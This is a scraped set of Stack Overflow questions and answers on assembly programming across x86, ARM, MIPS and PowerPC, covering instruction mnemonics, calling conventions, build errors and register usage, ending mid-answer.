<p>Also, don't confuse <code>cwtl</code> with <code>cwtd</code> (<a href=""http://www.felixcloutier.com/x86/CWD:CDQ:CQO.html"" rel=""nofollow noreferrer"">aka CWD</a>: sign extend ax into dx:ax, e.g. to set up for idiv).</p>

<p>The AT&amp;T mnemonics are pretty horrible here.  <code>l</code> vs. <code>d</code>, really?  The Intel mnemonics all have <code>e</code> on the end for the ones that extend within rax, and not for the ones that extend into (part of) rdx.  Except for CBW, but of course that extends al into ax, because even 8086 had 16bit registers, so never needed to store 16bit values in dl:al.  <code>idiv r/m8</code> uses ax as a source reg, not dl:al (and puts the results in ah, al)).</p>

<hr>

<blockquote>
  <p>redundancies</p>
</blockquote>

<p>Yes, this is one of many redundancies in x86 assembly language.  e.g. <code>sub eax,eax</code> to zero rax vs. <a href=""https://stackoverflow.com/questions/33666617/which-is-best-way-to-set-a-register-to-zero-in-x86-assembly-xor-mov-or-and/33668295#33668295""><code>xor eax,eax</code></a>.  (<code>mov eax,0</code> isn't totally redundant, because it doesn't affect flags.  If you include slight differences like that as redundant, or even instructions that run on different execution ports, there are lots of ways to do some things.).</p>

<p>If I had the chance to modify the x86-64 ISA, I would probably give MOVZX and MOVSX single-byte opcodes (instead of <code>0F XX</code> two-byte escaped opcodes), at least the 8-bit-source versions.  So <code>movsx eax, byte [mem]</code> is as compact as <code>mov al, [mem]</code>. (They're already the same performance on Intel CPUs: handled entirely in the load port, with no ALU uop).  Most real code fails to take advantage of <code>[u]int16_t</code> arrays for higher cache density, so I think movs/zx from word to dword or qword is rarer.  Or maybe there's enough wide-character code around to justify shorter opcodes for <code>MOVZX r32/r64, r/m16</code>.  To make some room, we can drop the CBW / CWDE / CDQE opcode entirely.  I might keep CWD / CDQ / CQO as a useful setup for idiv, which has no one-instruction equivalent.</p>

<p>In reality, probably having fewer single-byte opcodes and more escape prefixes would be a lot more useful (e.g. so common SSE2 insns can be 2 opcode bytes + ModRM, instead of the usual 3 or 4 opcode bytes).  Instruction-decoding is less of a bottleneck with shorter instructions in high-performance loops.  But if x86-64 machine code is too different from 32-bit, we need extra decode transistors.  That may be ok now that power limitations have made <a href=""https://en.wikipedia.org/wiki/Dark_silicon"" rel=""nofollow noreferrer"">dark silicon</a> a thing, because a core would never need its 32-bit decoder powered on at the same time as its 64-bit decoder.  That wasn't the case when AMD was designing AMD64.</p>

<p>Instead of CDQ, we could made two-operand shift instructions, with a non-destructive destination, so <code>sar edx, eax, 31</code> would do CDQ in 3 bytes.  Dropping the one-byte xchg-with-eax opcodes (other than 0x90 <code>xchg eax,eax</code> NOP) would free up lots of coding space for <a href=""http://www.felixcloutier.com/x86/SAL:SAR:SHL:SHR.html"" rel=""nofollow noreferrer"">sar, shr, shl</a> without needing the Reg field of the ModRM as extra opcode bits.  And of course remove the doesn't-affect-flags special case for shift_count=0 to kill the input dependency on FLAGS).  AMD had the chance to do (some of) this with AMD64, but chose to be conservative to share as many instruction-decode transistors as possible.  (Can't really fault them for that, but it's unfortunate that political/economic circumstances resulted in x86 missing its only chance for the foreseeable future to drop some of its legacy baggage.)  It also meant less work modifying code generation / analysis software, but that's a one-time cost and small potatoes compared to potentially making every x86-64 CPU run faster and have smaller binaries.</p>

<hr>

<p>See also the <a href=""/questions/tagged/x86"" class=""post-tag"" title=""show questions tagged &#39;x86&#39;"" rel=""tag"">x86</a> tag wiki for more links, including <a href=""http://www.posix.nl/linuxassembly/nasmdochtml/nasmdoca.html"" rel=""nofollow noreferrer"">this old appendix from the NASM manual</a> documenting when every form of every instruction was introduced.</p>
","37746322"
"How to get user input in assembly","7082","","<p>I want to get the number entered by the user into a register. This is my own OS. So, I cannot use this:</p>

<pre><code>mov al,0x01
int 0x21
mov dl,al ;move the integer entered by the user, into dl
</code></pre>

<p>since int 0x21 calles ms-dos. So what interuppt can I use?</p>
","<p>If you are running on a ""regular"" PC in real mode you can use int 0x10 for screen output, int 0x16 for keyboard input and int 0x13 (functions AH=2, 3, 8, 0x41, 0x42, 0x43) for disk access.</p>

<p>Most interrupts on a regular PC are documented quite well in ""Ralph Brown's interrupt list"" (search for that list in Google).</p>
","20823034"
"Does the return value always go into eax register after a method call?","7049","","<p>I have written a hooking library, that examines a PE executables dll import table, to create a library that enables changing of parameters and return values. I have a few questions on how the return value is passed from a function.</p>

<p>I have learned that the return value of a function is saved in the accumulator register. Is this always the case? If not, how does the compiler know where to look for the function result?</p>

<p>What about the return type size? An integer will easily fit, but what about a bigger structure? Does the caller reserve stack space so the method it calls could write the result onto stack?</p>
","<p>It's all specific to calling convention.</p>

<p>For most calling conventions floating point numbers are returned either on FPU-stack or in XMM registers.</p>

<p>Call to the function returning a structure</p>

<pre><code>    some_struct foo(int arg1, int arg2);
    some_struct s = foo(1, 2);
</code></pre>

<p>will be compiled into some equivalent of:</p>

<pre><code>    some_struct* foo(some_struct* ret_val, int arg1, int arg2);
    some_struct s; // constructor isn't called
    foo(&amp;s, 1, 2); // constructor will be called in foo
</code></pre>

<p><strong>Edit</strong>: (add info)</p>

<p>just to clarify: this works for all structs and classes even when <code>sizeof(some_struct) &lt;= 4</code>. So if you define small useful class like <code>ip4_type</code> with the only <code>unsigned</code> field and some constructors/convertors to/trom <code>unsigned</code>, <code>in_addr</code>, <code>char*</code> it will lack efficiency compared to use of raw <code>unigned</code> value.</p>
","21196092"
"ffmpeg neon compilation on android - assembler errors","7044","","<p>I am trying to compile ffmpeg for android with neon support , but I am getting following assembler errors. Please let me know if anybody has any clue about this?</p>

<pre><code>/home/user1/android-ndk-r5b/toolchains/arm-linux-androideabi-4.4.3/prebuilt/linux-x86/bin/arm-linux-androideabi-gcc -MMD -MP -MF /home/user1/workspace/FFMPEGFinal/obj/local/armeabi-v7a/objs/ffmpeg/libavcodec/arm/rdft_neon.o.d.org -fpic -ffunction-sections -funwind-tables -fstack-protector -D__ARM_ARCH_5__ -D__ARM_ARCH_5T__ -D__ARM_ARCH_5E__ -D__ARM_ARCH_5TE__  -Wno-psabi -march=armv7-a -mfloat-abi=softfp -mfpu=vfp -O2 -fomit-frame-pointer -fstrict-aliasing -funswitch-loops -finline-limit=300 -I/home/user1/workspace/FFMPEGFinal/jni/SDL/include -I/home/user1/workspace/FFMPEGFinal/jni -DANDROID -DHAVE_AV_CONFIG_H -D_FILE_OFFSET_BITS=64 -D_LARGEFILE_SOURCE -DPIC -DCMP_HAVE_NEON -DCMP_HAVE_VFP -fasm -Wa,--noexecstack -O2 -DNDEBUG -g -I/home/user1/android-ndk-r5b/platforms/android-8/arch-arm/usr/include -c  /home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S -o /home/user1/workspace/FFMPEGFinal/obj/local/armeabi-v7a/objs/ffmpeg/libavcodec/arm/rdft_neon.o &amp;&amp; rm -f /home/user1/workspace/FFMPEGFinal/obj/local/armeabi-v7a/objs/ffmpeg/libavcodec/arm/rdft_neon.o.d &amp;&amp; mv /home/user1/workspace/FFMPEGFinal/obj/local/armeabi-v7a/objs/ffmpeg/libavcodec/arm/rdft_neon.o.d.org /home/user1/workspace/FFMPEGFinal/obj/local/armeabi-v7a/objs/ffmpeg/libavcodec/arm/rdft_neon.o.d
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S: Assembler messages:
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:54: Error: bad instruction `vld1.32 {d0},[r0,:64]!'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:55: Error: bad instruction `vld1.32 {d1},[r1,:64],r8'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:56: Error: bad instruction `vld1.32 {d4},[r2,:64]!'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:57: Error: bad instruction `vld1.32 {d5},[r3,:64]!'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:58: Error: bad instruction `vmov.f32 d18,#0.5'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:59: Error: bad instruction `vdup.32 d19,r6'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:61: Error: selected processor does not support `veor d19,d18,d19'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:62: Error: bad instruction `vmov.i32 d16,#0'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:63: Error: bad instruction `vmov.i32 d17,#1&lt;&lt;31'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:65: Error: bad instruction `vtrn.32 d16,d17'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:67: Error: bad instruction `vrev64.32 d16,d16'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:70: Error: selected processor does not support `veor q1,q0,q8'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:71: Error: bad instruction `vld1.32 {d24},[r0,:64]!'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:72: Error: bad instruction `vadd.f32 d0,d0,d3'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:73: Error: bad instruction `vld1.32 {d25},[r1,:64],r8'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:74: Error: bad instruction `vadd.f32 d1,d2,d1'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:75: Error: selected processor does not support `veor q3,q12,q8'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:77: Error: bad instruction `vmul.f32 q10,q0,q9'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:79: Error: bad instruction `vadd.f32 d0,d24,d7'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:80: Error: bad instruction `vadd.f32 d1,d6,d25'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:81: Error: bad instruction `vmul.f32 q11,q0,q9'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:82: Error: selected processor does not support `veor d7,d21,d16'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:83: Error: bad instruction `vrev64.32 d3,d21'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:84: Error: selected processor does not support `veor d6,d20,d17'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:85: Error: selected processor does not support `veor d2,d3,d16'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:86: Error: bad instruction `vmla.f32 d20,d3,d4[1]'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:87: Error: bad instruction `vmla.f32 d20,d7,d5[1]'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:88: Error: bad instruction `vmla.f32 d6,d2,d4[1]'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:89: Error: bad instruction `vmla.f32 d6,d21,d5[1]'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:90: Error: bad instruction `vld1.32 {d4},[r2,:64]!'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:91: Error: selected processor does not support `veor d7,d23,d16'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:92: Error: bad instruction `vld1.32 {d5},[r3,:64]!'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:93: Error: selected processor does not support `veor d24,d22,d17'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:94: Error: bad instruction `vrev64.32 d3,d23'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:96: Error: selected processor does not support `veor d2,d3,d16'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:98: Error: bad instruction `vmla.f32 d22,d3,d4[0]'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:99: Error: bad instruction `vmla.f32 d22,d7,d5[0]'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:100: Error: bad instruction `vmla.f32 d24,d2,d4[0]'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:101: Error: bad instruction `vmla.f32 d24,d23,d5[0]'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:102: Error: bad instruction `vld1.32 {d0},[r0,:64]!'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:103: Error: bad instruction `vld1.32 {d1},[r1,:64],r8'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:104: Error: bad instruction `vst1.32 {d20},[r7,:64]!'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:105: Error: bad instruction `vst1.32 {d6},[lr,:64],r8'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:106: Error: bad instruction `vst1.32 {d22},[r7,:64]!'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:107: Error: bad instruction `vst1.32 {d24},[lr,:64],r8'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:111: Error: selected processor does not support `veor q1,q0,q8'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:112: Error: bad instruction `vadd.f32 d0,d0,d3'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:113: Error: bad instruction `vadd.f32 d1,d2,d1'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:115: Error: bad instruction `vmul.f32 q10,q0,q9'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:118: Error: bad instruction `vld1.32 {d0[0]},[r0,:32]'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:119: Error: selected processor does not support `veor d7,d21,d16'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:120: Error: bad instruction `vrev64.32 d3,d21'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:121: Error: selected processor does not support `veor d6,d20,d17'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:122: Error: bad instruction `vld1.32 {d22},[r5,:64]'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:123: Error: bad instruction `vdup.32 d1,r2'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:124: Error: selected FPU does not support instruction -- `vmov d23,d22'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:125: Error: selected processor does not support `veor d2,d3,d16'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:126: Error: bad instruction `vtrn.32 d22,d23'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:127: Error: selected processor does not support `veor d0,d0,d1'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:128: Error: selected processor does not support `veor d23,d23,d17'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:129: Error: bad instruction `vmla.f32 d20,d3,d4[1]'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:130: Error: bad instruction `vmla.f32 d20,d7,d5[1]'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:131: Error: bad instruction `vmla.f32 d6,d2,d4[1]'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:132: Error: bad instruction `vmla.f32 d6,d21,d5[1]'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:133: Error: bad instruction `vadd.f32 d22,d22,d23'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:134: Error: bad instruction `vst1.32 {d20},[r7,:64]'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:135: Error: bad instruction `vst1.32 {d6},[lr,:64]'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:136: Error: bad instruction `vst1.32 {d0[0]},[r0,:32]'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:137: Error: bad instruction `vst1.32 {d22},[r5,:64]'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:142: Error: bad instruction `vmul.f32 d22,d22,d18'
/home/user1/workspace/FFMPEGFinal/jni/libavcodec/arm/rdft_neon.S:143: Error: bad instruction `vst1.32 {d22},[r5,:64]'
make: *** [/home/user1/workspace/FFMPEGFinal/obj/local/armeabi-v7a/objs/ffmpeg/libavcodec/arm/rdft_neon.o] Error 1
</code></pre>
","<p>Well the assembler obviously doesn't recognize those Neon-specific mnemonics.</p>

<p>According to <a href=""http://gcc.gnu.org/onlinedocs/gcc/ARM-NEON-Intrinsics.html"" rel=""noreferrer"">http://gcc.gnu.org/onlinedocs/gcc/ARM-NEON-Intrinsics.html</a> you need to compile with <code>-mfpu=neon</code>. Try adding this line to your Android makefile:</p>

<pre><code>CFLAGS += -mfpu=neon
</code></pre>
","5197714"
"difference between ldr and ldr.w","7043","","<p>I recently had to debug a MachO binary and I came across the following instruction :-</p>

<p><code>ldr.w  r4, [r1, r0, lsl #2]</code></p>

<p>I understand that <code>ldr  r4, [r1, r0, lsl #2]</code> shifts r0 to the left two times, adds it to r1 and dereferences the result.</p>

<p>How is ldr.w different?</p>
","<p><code>.W</code> is an optional instruction width specifier. It doesn't affect the behaviour of the instruction as such, it just ensures that a 32 bit instruction is generated. See <a href=""http://infocenter.arm.com/help/index.jsptopic=/com.arm.doc.kui0100a/armasm_cihjffga.htm"" rel=""noreferrer"">infocenter.arm.com</a> for details:</p>

<p><em><strong>LDR (pc-relative) in Thumb-2</strong>
You can use the .W width specifier to force LDR to generate a 32-bit instruction in Thumb-2 code. LDR.W always generates a 32-bit instruction, even if the target could be reached using a 16-bit LDR.
For forward references, LDR without .W always generates a 16-bit instruction in Thumb code, even if that results in failure for a target that could be reached using a 32-bit Thumb-2 LDR instruction.</em> </p>
","9800623"
"strlen in assembly","7034","","<p>I made my own implementation of strlen in assembly, but it doesn't return the correct value. It returns the string length + 4. Consequently. I don't see why.. and I hope any of you do...
<br /><br />Assembly source:</p>

<pre><code>section .text
    [GLOBAL stringlen:] ; C function

stringlen:  
    push ebp
    mov ebp, esp        ; setup the stack frame

    mov ecx, [ebp+8]

    xor eax, eax        ; loop counter


startLoop:
    xor edx, edx
    mov edx, [ecx+eax]
    inc eax

    cmp edx, 0x0 ; null byte    
    jne startLoop
end:    
    pop ebp

    ret
</code></pre>

<p>And the main routine:</p>

<pre><code>#include &lt;stdio.h&gt;

extern int stringlen(char *);

int main(void)
{
  printf(""%d"", stringlen(""h""));

  return 0;
}
</code></pre>

<p><b>Thanks</b></p>
","<p>You are not accessing bytes (characters), but doublewords. So your code is not looking for a single terminating zero, it is looking for 4 consecutive zeroes. Note that won't always return correct value +4, it depends on what the memory after your string contains. </p>

<p>To fix, you should use byte accesses, for example by changing <code>edx</code> to <code>dl</code>.</p>
","5041813"
"x86 assembly (MASM) - Square root of a 64-bit integer?","7018","","<p>I'm coding a simple primality tester program for Windows in x86 assembly language (MASM32), which involves calculating a square root of a (64-bit) integer. My question is: Is there any simple way for obtaining the square root? Should I use some combination of ADD/SUB/DIV/MUL instructions?</p>

<p>I found some <a href=""http://www.codecodex.com/wiki/Calculate_an_integer_square_root"" rel=""nofollow"">information</a> on how this could be achieved in C language, but I'm just wondering if I'm missing something here?</p>
","<p>I think the simplest way is to use the FPU instruction <code>fsqrt</code> like this:</p>

<pre><code>.data?
int64 dq ?
squareRoot dd ?

.code
fild int64        ;load the integer to ST(0)
fsqrt             ;compute square root and store to ST(0)
fistp squareRoot  ;store the result in memory (as a 32-bit integer) and pop ST(0)
</code></pre>
","8808983"
"What's the equivalent of BP register ( Frame Pointer ) on ARM processors?","7003","","<p>On intel platforms, <code>BP</code> is used to point to the beginning of the stack frame and to access the arguments <code>[bp+0x??]</code> and local variables <code>[bp-0x??]</code>. </p>

<p>Which register is used in ARM? Or, is the addressing based on SP only?</p>

<p>[I don't have infrastructure to compile and disassemble to see it by myself. Referring to AAPCS did not help me either]</p>
","<p>What you are looking for is the Frame Pointer. Generally, <code>R7</code> acts as the frame pointer in THUMB mode and <code>R11</code> acts as the frame pointer in ARM mode. But it is under the discretion of the OS to change this convention if it wishes to.</p>

<p>Read <a href=""http://msdn.microsoft.com/en-us/library/ms253599%28v=vs.80%29.aspx"">here</a></p>
","10928927"
"Why isn't pass struct by reference a common optimization?","6999","","<p>Up until today, I had always thought that decent compilers automatically convert struct pass-by-value to pass-by-reference if the struct is large enough that the latter would be faster.  To the best of my knowledge, this seems like a no-brainer optimization.  However, to satisfy my curiosity as to whether this actually happens, I created a simple test case in both C++ and <a href=""http://www.digitalmars.com/d/1.0"" rel=""noreferrer"">D</a> and looked at the output of both GCC and Digital Mars D.  Both insisted on passing 32-byte structs by value when all the function in question did was add up the members and return the values, with no modification of the struct passed in.  The C++ version is below.</p>

<pre><code>#include ""iostream.h""

struct S {
    int i, j, k, l, m, n, o, p;
};

int foo(S s) {
    return s.i + s.j + s.k + s.l + s.m + s.n + s.o + s.p;
}

int main() {
    S s;
    int bar = foo(s);
    cout &lt;&lt; bar;
}
</code></pre>

<p>My question is, why the heck wouldn't something like this be optimized by the compiler to pass-by-reference instead of actually pushing all those <code>int</code>s onto the stack?</p>

<p>Note:  Compiler switches used:  GCC -O2 (-O3 inlined foo().), DMD -O -inline -release.</p>

<p>Edit:  Obviously, in the general case the semantics of pass-by-value vs. pass-by-reference won't be the same, such as if copy constructors are involved or the original struct is modified in the callee.  However, in a lot of real-world scenarios, the semantics will be identical in terms of observable behavior.  These are the cases I'm asking about.</p>
","<p>Don't forget that in C/C++ the compiler needs to be able to compile a call to a function based only on the function declaration.</p>

<p>Given that callers might be using only that information, there's no way for a compiler to compile the function to take advantage of the optimization you're talking about.  The caller can't know the function won't modify anything and so it can't pass by ref. Since some callers might pass by value due to lack of detailed information, the function has to be compiled assuming pass-by-value and everybody needs to pass by value.</p>

<p>Note that even if you marked the parameter as '<code>const</code>', the compiler still can't perform the optimization, because the function could be lying and cast away the constness (this is permitted and well-defined as long as the object being passed in is actually not const).</p>

<p>I think that for static functions (or those in an anonymous namespace), the compiler could possibly make the optimization you're talking about, since the function does not have external linkage.  As long as the address of the function isn't passed to some other routine or stored in a pointer, it should not be callable from other code. In this case the compiler could have full knowledge of all callers, so I suppose it could make the optimization.</p>

<p>I'm not sure if any do (actually, I'd be surprised if any do, since it probably couldn't be applied very often).</p>

<p>Of course, as the programmer (when using C++) you can force the compiler to perform this optimization by using <code>const&amp;</code> parameters whenever possible.  I know you're asking why the compiler can't do it automatically, but I suppose this is the next best thing.</p>
","552155"
"Dereferencing a label in x86 assembly","6996","","<p>Consider this x86 assembly code:</p>

<pre><code>section .data

foo:
    mov ebx, [boo]
    mov [goo], ebx
goo:
    mov eax, 2
    mov eax, 3
    ret
boo:
    mov eax, 4
    mov eax, 5
    ret
</code></pre>

<p>What exactly is going on here? When I dereference <code>[boo]</code> and <code>mov</code> it to <code>[goo]</code> what exactly am I moving there? Just one command? The <code>ret</code> as well?</p>

<hr>

<p>Follow-up questions:</p>

<ol>
<li>Does dereferencing a label give me an address? Or the machine code for the first command in the label?</li>
<li>If it's a machine code - how can it possibly be more than one command? Aren't all commands essentially 32-bit (even if not all bits are used)?</li>
<li>Bottom line - will <code>eax</code> have a value of 3 or 5 at the end?</li>
</ol>
","<p><code>boo</code> is the offset of the instruction <code>mov eax, 3</code> inside section <code>.data</code>.
<code>mov ebx, [boo]</code> means “fetch four bytes at the offset indicated by <code>boo</code> inside <code>ebx</code>”.
Likewise, <code>mov [goo], ebx</code> would move the content of ebx at the offset indicated by <code>goo</code>.</p>

<p>However, code is often read-only, so it wouldn't be surprising to see the code just crashing.</p>

<p>Here is how the instructions at <code>boo</code> are encoded:</p>

<pre><code>boo:
b8 03 00 00 00          mov    eax,0x3
c3                      ret
</code></pre>

<p>So what you get in <code>ebx</code> is actually 4/5 of the <code>mov eax, 3</code> instruction.</p>
","1296586"
"How does the assembly TEST instruction work with these jump instructions?","6986","","<p>Using AT&amp;T assembly syntax, I'm trying to understand how <code>testl</code> is used in assembly code. Specifically:</p>

<pre><code>testl  %edx, %edx
jle    .L3
</code></pre>

<p>I know <code>testl</code> does a bitwise <code>and</code> of the same value to set the condition flags, but how can I interpret 'jump if less than or equal to' if it isn't comparing two values?</p>
","<p>Here's an excerpt from the official documentation from Intel on test:</p>

<pre><code>Operation
TEMP ← SRC1 AND SRC2;
SF ← MSB(TEMP);
IF TEMP = 0
    THEN ZF ← 1;
    ELSE ZF ← 0;
FI:
PF ← BitwiseXNOR(TEMP[0:7]);
CF ← 0;
OF ← 0;
</code></pre>

<p>And the same on jle:</p>

<pre><code>Jump if less or equal (ZF=1 or SF≠OF)
</code></pre>

<p>So, the jump will be performed if <code>edx</code> is 0 (because <code>edx AND edx = edx</code> and that's 0 only when <code>edx</code> is 0, and because <code>ZF</code> is set to 1 when the result of <code>AND</code> is 0) or if the most significant bit of <code>edx</code> is 1 (because <code>SF = most significant bit</code> of <code>edx AND edx</code> (or, equivalently, of <code>edx</code> itself) and <code>OF</code> is always 0, which means <code>SF ≠ OF</code> is only true when <code>SF ≠ 0</code>).</p>

<p>IOW, the jump will be performed only if <code>edx</code> is ≤ 0 when interpreted as a signed integer or, equivalently, when <code>edx</code> is either 0 or greater or equal than 0x80000000 when interpreted as an unsigned integer.</p>
","14595965"
"MIPS Assembly Pointer-to-a Pointer?","6976","","<p>I think I know how to handle this case, but I just want to make sure I have it right.  Say you have the following C code:</p>

<pre><code>int myInt = 3;
int* myPointer = &amp;myInt;
int** mySecondPointer = &amp;myPointer;
</code></pre>

<p>P contains an address that points to a place in memory which has another address.  I'd like to modify the second address.  So the MIPS code:</p>

<pre><code>la $t0, my_new_address
lw $t1, ($a0) # address that points to the address we want to modify
sw $t0, ($t1) # load address into memory pointed to by $t1
</code></pre>

<p>Is that the way you would do it?</p>
","<p>Yes, that's correct as far as I can tell. It would have been easier if you used the same variable names (e.g. symbols instead of hard register names).</p>

<p>Why haven't you simply compiled the c-code and took a look at the list-file or assembly-output? I always do that when in doubt.</p>
","98295"
"PowerPC Assembly Load Immediate","6960","","<p>I am new to PowerPC assembly. I am working with an MPC8245 (yes, old school). This is a 603e family processor.</p>

<p>I would like to know how to create a load immediate instruction where the immediate 16-bit value is 'unsigned'.</p>

<p>Example: li r3,0xFC10</p>

<p>The gcc cross-compiler, 4.4.5, I am using does not allow this instruction as the value is not a signed constant.</p>

<p>Yes, I could use minus the 2-s complement, but this makes reading and documenting the code more difficult. When loading bit fields for device registers, having the exact bit fields in the instruction is much easier to read.</p>
","<p><code>li</code> is a pseudo-opcode which actually translates as an <code>addi</code> instruction.</p>

<p><code>addi rD, rA, SIMM</code> adds the signed immediate <code>SIMM</code> to <code>rA</code>, placing the result in <code>rD</code>, <em>except</em> when the <code>rA</code> field is 0, in which case it specifies a literal 0 instead of <code>r0</code>.  <code>li rD, SIMM</code> is really <code>addi rD, 0, SIMM</code>.</p>

<p>This is good for loading values from <code>0</code>-<code>0x7fff</code> and <code>0xffff8000</code>-<code>0xffffffff</code> into a register, but not other values.</p>

<p>The immediate bitwise operation opcodes (<code>ori</code> etc.) do interpret the 16-bit immediate field as an unsigned value.  However they do not have the ""<code>r0</code> means a literal <code>0</code>"" behaviour of <code>addi</code>.</p>

<p>You will need to use two instructions to load a constant of <code>0xfc10</code> into a register: load the register with 0 using <code>li</code> (or <code>lis</code>, as if you were loading the top half of an arbitrary 32-bit constant) and then OR in the unsigned 16-bit value with <code>ori</code>.</p>

<p>This is exactly what <code>gcc</code> does under the circumstances:</p>

<pre><code>$ cat test.c
unsigned int test(void)
{
    return 0xfc10;
}
$ gcc -O2 -c test.c
$ objdump -d test.o

test.o:     file format elf32-powerpc

Disassembly of section .text:

00000000 &lt;test&gt;:
   0:   38 60 00 00     li      r3,0
   4:   60 63 fc 10     ori     r3,r3,64528
   8:   4e 80 00 20     blr
   c:   60 00 00 00     nop
$
</code></pre>

<hr>

<p>I don't <em>think</em> the GNU assembler has any way of automatically generating two instructions to load such a value from a single source instruction when assembling for PowerPC.  However you can use the <code>@h</code> and <code>@l</code> suffixes to extract the (unsigned) high and low 16-bit halves of a constant, e.g.:</p>

<pre><code>lis r3, 0x12345678@h            /* =&gt; li  r3, 0x1234     */
ori r3, r3, 0x12345678@l        /* =&gt; ori r3, r3, 0x5678 */
</code></pre>

<p>You could use this to write your own macro for arbitrary constant loading...</p>

<pre><code>$ cat test2.s
        .macro  load_const rD, const
        .if (\const &gt;= -0x8000) &amp;&amp; (\const &lt;= 0x7fff)
        li      \rD, \const
        .else
        lis     \rD, \const@h
        ori     \rD, \rD, \const@l
        .endif
        .endm

        load_const r3, 0
        load_const r4, 1
        load_const r5, -1
        load_const r6, 0x7fff
        load_const r7, 0x8000
        load_const r8, -32767
        load_const r9, -32768
        load_const r10, -32769
        load_const r11, 0xfc10

$ as -mregnames -o test2.o test2.s
$ objdump -d test2.o

